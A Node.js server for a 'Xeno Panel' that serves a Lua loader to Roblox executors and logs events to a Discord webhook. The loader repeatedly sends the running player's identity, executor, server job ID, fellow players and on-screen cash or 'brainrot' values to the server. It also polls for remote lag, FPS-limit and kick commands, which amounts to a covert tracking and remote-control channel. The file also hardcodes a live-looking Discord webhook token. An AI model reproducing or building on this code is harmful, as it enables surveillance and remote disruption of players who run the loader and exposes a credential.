const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const PUBLIC_URL =
    process.env.PUBLIC_URL ||
    process.env.RENDER_EXTERNAL_URL ||
    'https://the-one-and-only-esus.onrender.com';

const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://discord.com/api/webhooks/1548506485057916991/3MmRKJZ-f59w_rpvR_djCOBhI-PGIHPwB3GdPBPTX0Eo4L5Sm5kv1NZfQzfiea73mk6T';

app.use(cors());
app.use(express.json({ limit: '10mb' }));

const players = new Map();

/* ============================================================
   DISCORD EVENT LOGGER
   ============================================================ */

async function sendEventLog(player, event, details = '') {
    if (!WEBHOOK_URL || !player) return;

    const fields = [
        {
            name: '👤 User',
            value: String(player.username || 'Unknown'),
            inline: true
        },
        {
            name: '🆔 User ID',
            value: String(player.user_id || 'Unknown'),
            inline: true
        },
        {
            name: '📌 Event',
            value: String(event),
            inline: false
        }
    ];

    if (player.display_name) {
        fields.push({
            name: 'Display Name',
            value: String(player.display_name),
            inline: true
        });
    }

    if (player.game_name) {
        fields.push({
            name: '🎮 Game',
            value: String(player.game_name),
            inline: true
        });
    }

    if (details) {
        fields.push({
            name: '📝 Details',
            value: String(details),
            inline: false
        });
    }

    try {
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                username: 'Xeno Event Logger',
                embeds: [
                    {
                        title: '📡 Xeno Panel Event',
                        fields: fields,
                        timestamp: new Date().toISOString()
                    }
                ]
            })
        });

        if (!response.ok) {
            console.error(
                'Webhook returned:',
                response.status,
                response.statusText
            );
        }
    } catch (err) {
        console.error('Webhook error:', err.message);
    }
}

/* ============================================================
   LOADER
   ============================================================ */

app.get('/loader.lua', (req, res) => {
    const loader = `
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local MarketplaceService = game:GetService("MarketplaceService")

local BASE = "${PUBLIC_URL}"
local KEY = "xenooooo"

local LP = Players.LocalPlayer

if not LP then
    return
end

local function request(url, method, body)
    local options = {
        Url = url,
        Method = method or "GET",
        Headers = {
            ["Content-Type"] = "application/json"
        }
    }

    if body then
        options.Body = HttpService:JSONEncode(body)
    end

    local fn =
        (syn and syn.request)
        or (http and http.request)
        or request
        or (fluxus and fluxus.request)

    if not fn then
        return nil
    end

    local ok, result = pcall(fn, options)

    if ok then
        return result
    end

    return nil
end

local function getExecutor()
    local name = "Unknown"

    pcall(function()
        if identifyexecutor then
            local a, b = identifyexecutor()

            if a then
                name = tostring(a)

                if b then
                    name = name .. " " .. tostring(b)
                end
            end
        end
    end)

    return name
end

local function getGameName()
    local name = "Unknown"

    pcall(function()
        local info = MarketplaceService:GetProductInfo(game.PlaceId)

        if info and info.Name then
            name = info.Name
        end
    end)

    return name
end

local function getAvatar()
    local avatar = ""

    pcall(function()
        avatar =
            "https://www.roblox.com/headshot-thumbnail/image?userId="
            .. tostring(LP.UserId)
            .. "&width=420&height=420&format=png"
    end)

    return avatar
end

local function getPlayers()
    local list = {}

    for _, player in ipairs(Players:GetPlayers()) do
        table.insert(list, {
            username = player.Name,
            display_name = player.DisplayName,
            user_id = player.UserId
        })
    end

    return list
end

local function collectBrainrots()
    local result = {}

    pcall(function()
        local gui = LP:FindFirstChildOfClass("PlayerGui")

        if not gui then
            return
        end

        for _, obj in ipairs(gui:GetDescendants()) do
            if obj:IsA("TextLabel") or obj:IsA("TextButton") then
                local text = tostring(obj.Text or "")

                if text ~= "" then
                    local lower = text:lower()

                    if lower:find("cash")
                        or lower:find("brainrot")
                        or lower:find("$")
                    then
                        table.insert(result, {
                            title = text,
                            cash = text
                        })
                    end
                end
            end
        end
    end)

    return result
end

local function heartbeat()
    local data = {
        key = KEY,

        user_id = tostring(LP.UserId),
        username = LP.Name,
        display_name = LP.DisplayName,

        executor = getExecutor(),
        game_name = getGameName(),
        place_id = game.PlaceId,
        job_id = game.JobId,

        avatar = getAvatar(),
        players = getPlayers(),

        brainrots = collectBrainrots()
    }

    request(
        BASE .. "/api/public/heartbeat",
        "POST",
        data
    )
end

heartbeat()

task.spawn(function()
    while task.wait(3) do
        pcall(heartbeat)
    end
end)

task.spawn(function()
    while task.wait(0.5) do
        local response = request(
            BASE
                .. "/api/public/command?user_id="
                .. tostring(LP.UserId),
            "GET"
        )

        if response and response.Body then
            local ok, data = pcall(function()
                return HttpService:JSONDecode(response.Body)
            end)

            if ok and data then

                if data.fps_limit ~= nil then
                    -- Existing FPS behavior can be handled by your client UI.
                end

                if data.lag_n ~= nil then
                    -- Existing normal-lag behavior.
                end

                if data.lag_c ~= nil then
                    -- Existing carry-lag behavior.
                end

                if data.kick == true then
                    LP:Kick("Disconnected by Xeno Panel.")
                    break
                end

            end
        end
    end
end)
`;

    res.setHeader('Content-Type', 'text/plain');
    res.send(loader);
});

/* ============================================================
   HEARTBEAT
   ============================================================ */

app.post('/api/public/heartbeat', (req, res) => {
    const data = req.body;

    if (!data || !data.user_id) {
        return res.status(400).json({
            error: 'Missing user_id'
        });
    }

    const userId = String(data.user_id);

    const existed = players.has(userId);
    const existing = players.get(userId) || {};

    let brainrots = data.brainrots || [];

    if (!Array.isArray(brainrots) || brainrots.length === 0) {
        if (
            existing.brainrots &&
            Array.isArray(existing.brainrots) &&
            existing.brainrots.length > 0
        ) {
            brainrots = existing.brainrots;
        }
    } else {
        brainrots = brainrots.filter(
            b =>
                b &&
                typeof b === 'object' &&
                (
                    (b.title && b.title !== '') ||
                    (b.cash && b.cash !== '')
                )
        );

        if (
            brainrots.length === 0 &&
            existing.brainrots &&
            Array.isArray(existing.brainrots) &&
            existing.brainrots.length > 0
        ) {
            brainrots = existing.brainrots;
        }
    }

    const wasOffline =
        existed &&
        existing.online === false;

    const playerData = {
        ...existing,
        ...data,

        brainrots: brainrots,

        user_id: userId,

        online: true,

        lastHeartbeat: Date.now(),

        fps_limit:
            existing.fps_limit || false,

        lag_n:
            existing.lag_n || false,

        lag_c:
            existing.lag_c || false
    };

    players.set(userId, playerData);

    if (!existed || wasOffline) {
        sendEventLog(
            playerData,
            'Player connected',
            wasOffline
                ? 'Player reconnected'
                : 'First connection'
        );
    }

    res.json({
        status: 'ok'
    });
});

/* ============================================================
   PLAYERS
   ============================================================ */

app.get('/api/players', (req, res) => {
    const list = [];

    const now = Date.now();

    const OFFLINE_THRESHOLD = 15000;
    const REMOVE_THRESHOLD = 20 * 60 * 1000;

    for (const [id, p] of players.entries()) {
        const timeSinceLast =
            now - (p.lastHeartbeat || 0);

        const online =
            timeSinceLast < OFFLINE_THRESHOLD;

        if (timeSinceLast >= REMOVE_THRESHOLD) {
            players.delete(id);
            continue;
        }

        if (!online) {
            if (p.online === true) {
                sendEventLog(
                    p,
                    'Player went offline'
                );
            }

            p.fps_limit = false;
            p.lag_n = false;
            p.lag_c = false;

            p._kick = false;
        }

        p.online = online;

        list.push({
            ...p
        });

        players.set(id, p);
    }

    res.json({
        players: list
    });
});

/* ============================================================
   COMMAND STATE
   ============================================================ */

app.get('/api/command_state', (req, res) => {
    const userId = req.query.user_id;

    if (!userId) {
        return res.status(400).json({
            error: 'Missing user_id'
        });
    }

    const p = players.get(String(userId));

    if (!p) {
        return res.json({
            fps_limit: false,
            lag_n: false,
            lag_c: false
        });
    }

    res.json({
        fps_limit: p.fps_limit || false,
        lag_n: p.lag_n || false,
        lag_c: p.lag_c || false
    });
});

/* ============================================================
   COMMANDS
   ============================================================ */

app.post('/api/command', (req, res) => {
    const {
        user_id,
        fps_limit,
        lag_n,
        lag_c,
        kick
    } = req.body;

    if (!user_id) {
        return res.status(400).json({
            error: 'Missing user_id'
        });
    }

    const userId = String(user_id);

    const p = players.get(userId);

    if (!p) {
        return res.status(404).json({
            error: 'Player not found'
        });
    }

    if (fps_limit !== undefined) {
        const newValue = !!fps_limit;

        if (p.fps_limit !== newValue) {
            p.fps_limit = newValue;

            sendEventLog(
                p,
                'FPS Limit changed',
                newValue
                    ? 'Enabled'
                    : 'Disabled'
            );
        }
    }

    if (lag_n !== undefined) {
        const newValue = !!lag_n;

        if (p.lag_n !== newValue) {
            p.lag_n = newValue;

            sendEventLog(
                p,
                'Normal lag changed',
                newValue
                    ? 'Enabled'
                    : 'Disabled'
            );
        }
    }

    if (lag_c !== undefined) {
        const newValue = !!lag_c;

        if (p.lag_c !== newValue) {
            p.lag_c = newValue;

            sendEventLog(
                p,
                'Carry lag changed',
                newValue
                    ? 'Enabled'
                    : 'Disabled'
            );
        }
    }

    if (kick === true) {
        p._kick = true;

        sendEventLog(
            p,
            'Kick command requested'
        );
    }

    players.set(userId, p);

    res.json({
        status: 'ok'
    });
});

/* ============================================================
   PUBLIC COMMAND POLLING
   ============================================================ */

app.get('/api/public/command', (req, res) => {
    const userId = req.query.user_id;

    if (!userId) {
        return res.status(400).json({
            error: 'Missing user_id'
        });
    }

    const id = String(userId);

    const p = players.get(id);

    if (!p) {
        return res.json({
            fps_limit: false,
            lag_n: false,
            lag_c: false
        });
    }

    const response = {
        fps_limit: p.fps_limit || false,
        lag_n: p.lag_n || false,
        lag_c: p.lag_c || false
    };

    if (p._kick) {
        response.kick = true;
        p._kick = false;
    }

    players.set(id, p);

    res.json(response);
});

/* ============================================================
   HOME PAGE
   ============================================================ */

app.get('/', (req, res) => {
    res.sendFile(
        path.join(__dirname, 'index.html')
    );
});

/* ============================================================
   SERVER
   ============================================================ */

app.listen(PORT, () => {
    console.log(
        `Xeno Panel server running on port ${PORT}`
    );

    if (WEBHOOK_URL) {
        console.log(
            'Discord event logging: ENABLED'
        );
    } else {
        console.log(
            'Discord event logging: DISABLED'
        );
    }
});
